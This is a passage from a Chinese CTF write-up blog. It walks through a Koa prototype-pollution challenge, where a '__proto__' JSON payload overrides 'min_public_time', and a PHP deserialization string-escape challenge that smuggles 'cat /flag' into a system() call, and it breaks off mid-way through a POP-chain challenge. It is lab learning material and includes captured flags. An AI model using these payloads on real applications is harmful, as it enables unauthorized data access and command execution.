class="string">&quot;./routes/&quot;</span> + p); app.<span class="title function_">use</span>(p.<span class="title function_">routes</span>()).<span class="title function_">use</span>(p.<span class="title function_">allowedMethods</span>()) &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`Server is running at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">分析：</span><br><span class="line">这段代码是一个基于 <span class="title class_">Node</span>.<span class="property">js</span> 和 <span class="title class_">Koa</span> 框架的 web 服务器应用程序。下面是这段代码的详细解释：</span><br><span class="line"></span><br><span class="line">环境变量设置</span><br><span class="line">通过 process.<span class="property">env</span>.<span class="property">NODE_ENV</span> 获取环境变量，如果不存在则默认为 <span class="string">&quot;production&quot;</span>。</span><br><span class="line">判断当前环境是否为开发环境，并设置到全局变量 isEnvDev 中。</span><br><span class="line">devOnly 函数用于只在开发环境中执行特定操作。</span><br><span class="line"></span><br><span class="line">配置加载</span><br><span class="line">加载配置文件 config.<span class="property">js</span> 和默认配置文件 config.<span class="property">default</span>.<span class="property">js</span>。如果 config.<span class="property">js</span> 中没有指定 server_port，则使用 config.<span class="property">default</span>.<span class="property">js</span> 中的 server_port。</span><br><span class="line"></span><br><span class="line">导入模块和初始化应用</span><br><span class="line">导入路径处理模块 path、<span class="title class_">Koa</span> 框架 koa、以及 <span class="title class_">Koa</span> 的 body 解析中间件 koa-bodyparser。</span><br><span class="line">初始化一个新的 <span class="title class_">Koa</span> 应用实例。</span><br><span class="line"></span><br><span class="line">中间件设置</span><br><span class="line">使用 koa-<span class="keyword">static</span> 中间件为静态资源提供服务，静态资源目录为 ./<span class="keyword">static</span>。</span><br><span class="line">在开发环境中，加载并执行 webpack.<span class="property">proxies</span>.<span class="property">dev</span>.<span class="property">js</span> 中定义的所有中间件。</span><br><span class="line">使用 koa-bodyparser 中间件解析请求体。如果请求体是无效的 <span class="title class_">JSON</span>，则将请求体设置为空对象。</span><br><span class="line"></span><br><span class="line">路由加载</span><br><span class="line">加载并执行 ./routes/info.<span class="property">js</span> 和 ./routes/submit.<span class="property">js</span> 中定义的路由。</span><br><span class="line"></span><br><span class="line">启动服务器</span><br><span class="line">监听指定的端口，并在控制台输出服务器运行状态。</span><br><span class="line"></span><br><span class="line">导出应用实例</span><br><span class="line">将 <span class="title class_">Koa</span> 应用实例导出，以便在其他模块中使用。</span><br><span class="line">这个应用程序的主要功能是提供一个 web 服务器，用于处理客户端的请求，并根据请求的 <span class="variable constant_">URL</span> 和方法调用相应的路由处理函数。同时，它还提供了静态资源服务，可以直接访问存放在 ./<span class="keyword">static</span> 目录中的文件。在开发环境中，它还支持通过 webpack.<span class="property">proxies</span>.<span class="property">dev</span>.<span class="property">js</span> 配置的中间件进行额外的处理，例如代理请求到另一个服务器。</span><br></pre></td></tr></table></figure><p>这段代码定义了一些变量 </p><p>主要是引用了info和submit的路由 并且这两个路由都在routes这个文件夹下</p><p>先看info.js</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SQL</span> = <span class="built_in">require</span>(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sql = <span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../config.default&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getInfo</span>(<span class="params">timestamp</span>) &#123;</span><br><span class="line">    timestamp = <span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="comment">// Remove test data from before the movie was released</span></span><br><span class="line">    <span class="keyword">let</span> minTimestamp = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="variable constant_">CONFIG</span>.<span class="property">min_public_time</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">min_public_time</span>).<span class="title function_">getTime</span>();</span><br><span class="line">    timestamp = <span class="title class_">Math</span>.<span class="title function_">max</span>(timestamp, minTimestamp);</span><br><span class="line">    <span class="keyword">const</span> data = <span class="keyword">await</span> sql.<span class="title function_">all</span>(<span class="string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/info/:ts?&quot;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/x-www-form-urlencoded&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> ctx.<span class="property">params</span>.<span class="property">ts</span> === <span class="string">&quot;undefined&quot;</span>) ctx.<span class="property">params</span>.<span class="property">ts</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="regexp">/^[0-9]+$/</span>.<span class="title function_">test</span>(ctx.<span class="property">params</span>.<span class="property">ts</span> || <span class="string">&quot;&quot;</span>) ? <span class="title class_">Number</span>(ctx.<span class="property">params</span>.<span class="property">ts</span>) : ctx.<span class="property">params</span>.<span class="property">ts</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> timestamp !== <span class="string">&quot;number&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter ts&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> <span class="title function_">getInfo</span>(timestamp).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>主要看getInfo这个函数 它接收了timestamp</p><p>这段代码是一个异步函数，它接受一个参数 <code>timestamp</code>，并从数据库中查询特定时间戳之后的所有信息。下面是这段代码的逐行解释：</p><ol><li><code>async function getInfo(timestamp) &#123;</code>: 定义一个异步函数 <code>getInfo</code>，它接受一个参数 <code>timestamp</code>。</li><li><code>timestamp = typeof timestamp === &quot;number&quot; ? timestamp : Date.now();</code>: 如果传入的 <code>timestamp</code> 是数字，则保持不变；否则，使用当前时间戳。</li><li><code>// Remove test data from before the movie was released</code>: 这是一个注释，表示要删除电影发布前的测试数据。</li><li><strong>let minTimestamp &#x3D; new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();: 从配置中获取最小公开时间（默认为 DEFAULT_CONFIG.min_public_time），并将其转换为时间戳。</strong></li><li><strong>timestamp &#x3D; Math.max(timestamp, minTimestamp);: 将传入的 timestamp与最小时间戳进行比较，取两者中的较大值。这样做是为了确保查询的起始时间不会早于配置中指定的最小公开时间。</strong></li><li><code>const data = await sql.all(</code>SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;&#x3D; ?<code>, [timestamp]).catch(e =&gt; &#123; throw e &#125;);</code>: 使用 <code>await</code> 关键字等待异步 SQL 查询完成，并捕获可能的错误。这个查询从 <code>wishes</code> 表中选取所有在给定时间戳之后的时间记录。</li><li><code>return data;</code>: 返回查询到的数据。</li></ol><p>根据这段代码 我们可以知道timestamp一定&gt;&#x3D;minTimestamp </p><p>所以是怎么定义的呢</p><p>let minTimestamp &#x3D; new Date(CONFIG.min_public_time||DEFAULT_CONFIG.min_public_time).getTime(); </p><p>是根据CONFIG和DEFAULT_CONFIG来定义的 </p><p>所以我们要到CONFIG和DEFAULT_CONFIG中去看这是怎么个事 看看min_public_time是啥</p><p>CONFIG:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DEFAULT_CONFIG:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">app_name</span>: <span class="string">&quot;OtenkiGirl&quot;</span>,</span><br><span class="line">    <span class="attr">default_lang</span>: <span class="string">&quot;ja&quot;</span>,</span><br><span class="line">    <span class="attr">min_public_time</span>: <span class="string">&quot;2019-07-09&quot;</span>,</span><br><span class="line">    <span class="attr">server_port</span>: <span class="number">9960</span>,</span><br><span class="line">    <span class="attr">webpack_dev_port</span>: <span class="number">9970</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源代码：<strong>CONFIG.min_public_time</strong></p><p>查看根目录下的<code>config.js</code>和<code>config.default.js</code>后发现<code>config.js</code>并没有配置<code>min_public_time</code>，因此<code>getInfo</code>的第5行只是采用了<code>DEFAULT_CONFIG.min_public_time</code></p><p>考虑原型链污染污染<code>min_public_time</code>为我们想要的日期，就能绕过最早时间限制，获取任意时间的数据</p><p>所以查看提交函数  在routes这个文件夹下</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SQL</span> = <span class="built_in">require</span>(<span class="string">&quot;./sql&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> sql = <span class="keyword">new</span> <span class="title function_">SQL</span>(<span class="string">&quot;wishes&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Base58</span> = <span class="built_in">require</span>(<span class="string">&quot;base-58&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ALPHABET</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">rndText</span> = (<span class="params">length</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(&#123; length &#125;, <span class="function">() =&gt;</span> <span class="variable constant_">ALPHABET</span>[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="variable constant_">ALPHABET</span>.<span class="property">length</span>)]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">timeText</span> = (<span class="params">timestamp</span>) =&gt; &#123;</span><br><span class="line">    timestamp = (<span class="keyword">typeof</span> timestamp === <span class="string">&quot;number&quot;</span> ? timestamp : <span class="title class_">Date</span>.<span class="title function_">now</span>()).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">let</span> text1 = timestamp.<span class="title function_">substring</span>(<span class="number">0</span>, timestamp.<span class="property">length</span> / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">let</span> text2 = timestamp.<span class="title function_">substring</span>(timestamp.<span class="property">length</span> / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">let</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; text1.<span class="property">length</span>; i++)</span><br><span class="line">        text += text1[i] + text2[text2.<span class="property">length</span> - <span class="number">1</span> - i];</span><br><span class="line">    <span class="keyword">if</span> (text2.<span class="property">length</span> &gt; text1.<span class="property">length</span>) text += text2[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Base58</span>.<span class="title function_">encode</span>(<span class="title function_">rndText</span>(<span class="number">3</span>) + <span class="title class_">Buffer</span>.<span class="title function_">from</span>(text)); <span class="comment">// length = 20</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">rndID</span> = (<span class="params">length, timestamp</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="title function_">timeText</span>(timestamp);</span><br><span class="line">    <span class="keyword">if</span> (length &lt; t.<span class="property">length</span>) <span class="keyword">return</span> t.<span class="title function_">substring</span>(<span class="number">0</span>, length);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> t + <span class="title function_">rndText</span>(length - t.<span class="property">length</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">insert2db</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> date = <span class="title class_">String</span>(data[<span class="string">&quot;date&quot;</span>]), place = <span class="title class_">String</span>(data[<span class="string">&quot;place&quot;</span>]),</span><br><span class="line">        contact = <span class="title class_">String</span>(data[<span class="string">&quot;contact&quot;</span>]), reason = <span class="title class_">String</span>(data[<span class="string">&quot;reason&quot;</span>]);</span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">const</span> wishid = <span class="title function_">rndID</span>(<span class="number">24</span>, timestamp);</span><br><span class="line">    <span class="keyword">await</span> sql.<span class="title function_">run</span>(<span class="string">`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`</span>,</span><br><span class="line">        [wishid, date, place, contact, reason, timestamp]).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="keyword">throw</span> e &#125;);</span><br><span class="line">    <span class="keyword">return</span> &#123; wishid, date, place, contact, reason, timestamp &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/submit&quot;</span>, <span class="keyword">async</span> (ctx) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx.<span class="property">header</span>[<span class="string">&quot;content-type&quot;</span>] !== <span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Content-Type must be application/json&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> jsonText = ctx.<span class="property">request</span>.<span class="property">rawBody</span> || <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(jsonText);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data[<span class="string">&quot;contact&quot;</span>] !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> data[<span class="string">&quot;reason&quot;</span>] !== <span class="string">&quot;string&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Invalid parameter&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;contact&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span> || data[<span class="string">&quot;reason&quot;</span>].<span class="property">length</span> &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ctx.<span class="property">body</span> = &#123;</span><br><span class="line">                <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">                <span class="attr">msg</span>: <span class="string">&quot;Parameters contact and reason cannot be empty&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">DEFAULT</span> = &#123;</span><br><span class="line">            <span class="attr">date</span>: <span class="string">&quot;unknown&quot;</span>,</span><br><span class="line">            <span class="attr">place</span>: <span class="string">&quot;unknown&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> result = <span class="keyword">await</span> <span class="title function_">insert2db</span>(<span class="title function_">merge</span>(<span class="variable constant_">DEFAULT</span>, data));</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;success&quot;</span>,</span><br><span class="line">            <span class="attr">data</span>: result</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(e);</span><br><span class="line">        ctx.<span class="property">body</span> = &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="string">&quot;error&quot;</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;Internal Server Error&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>发现merge函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">dst, src</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> dst !== <span class="string">&quot;object&quot;</span> || <span class="keyword">typeof</span> src !== <span class="string">&quot;object&quot;</span>) <span class="keyword">return</span> dst;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> src) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> dst &amp;&amp; key <span class="keyword">in</span> src) &#123;</span><br><span class="line">            dst[key] = <span class="title function_">merge</span>(dst[key], src[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst[key] = src[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa96c7375.png" alt="image-20240203000237750"></p><p><strong>其实找找能够控制数组（对象）的“键名”的操作即可</strong></p><p>存在赋值操作dst[key] &#x3D; src[key]</p><p>即存在javascript原型链污染</p><p>因为默认时间是2019-07-09 所以我们只需要改成比这个小的时间即可绕过限制</p><p>注入<code>data[&#39;__proto__&#39;][&#39;min_public_time&#39;]</code>的值即可</p><p>提交信息必须为 JSON 格式，<code>contact</code>和<code>reason</code>字段是必须的</p><p>payload:</p><p>{“date”:”a”,”place”:”b”,”contact”:”c”,”reason”:”d”,”<code>__proto__</code>“: {    “min_public_time”: “1001-01-01”  }}</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa993772d.png" alt="image-20240203002355093"></p><p>再请求info</p><p>最后回显后找到flag</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa999a2cc.png" alt="image-20240203003307901"></p><p>海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag{546fa7b1-5caa-4d91-b604-217aa0a746ac}です</p><p>flag{546fa7b1-5caa-4d91-b604-217aa0a746ac}</p><p>终于完了 真的难 其实对这个javascript原型链污染还是有点半懵半懵的 主要是在这些代码是怎么串起来的 为什么向submit的merge传参后就会给到info里,并造成污染 代码审计啊代码审计 思路是清楚了 javascript原型链污染是个怎么个事也是知道了 就是下次做题的时候不一定做的对</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h4 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetFlag &#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $cmd = &quot;whoami&quot;;</span><br><span class="line">    public function __construct($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key = $key;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); www-data www-data </span><br></pre></td></tr></table></figure><p>反序列化字符串逃逸</p><p>bad 替换为 good  字符增加一位</p><p>序列化代码构造：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>结果：</p><p>O:7:”GetFlag”:2:{s:3:”key”;N;s:3:”cmd”;s:4:”ls &#x2F;“;}</p><p>需要逃逸的就是s:3:”cmd”;s:4:”ls &#x2F;“;} 然后为了更好的闭合我一般都会加上”; 这个符号 也就是需要逃逸”;s:3:”cmd”;s:4:”ls &#x2F;“;} 总共24个字符 这样我们只需要写24个bad就行了</p><p>?key&#x3D;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad”;s:3:”cmd”;s:4:”ls &#x2F;“;}</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa98d52c1.png" alt="image-20240205160515940"></p><p>所以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641fa97489fc.png" alt="image-20240205162138681"></p><p>flag{6431fc70-1a27-4717-a8a6-8341374a1b06}</p><h3 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span 